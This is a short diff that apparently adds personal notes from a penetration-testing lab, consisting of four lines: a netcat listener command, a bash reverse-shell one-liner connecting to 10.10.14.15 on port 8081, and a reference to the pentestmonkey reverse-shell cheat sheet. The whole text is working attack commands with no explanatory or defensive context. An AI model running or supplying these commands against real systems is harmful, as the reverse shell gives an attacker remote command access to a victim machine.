@@ -1,0 +1,4 @@
+nc -lvnp 8081
+pentestmonkey
+bash -i >& /dev/tcp/10.10.14.15/8081 0>&1
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
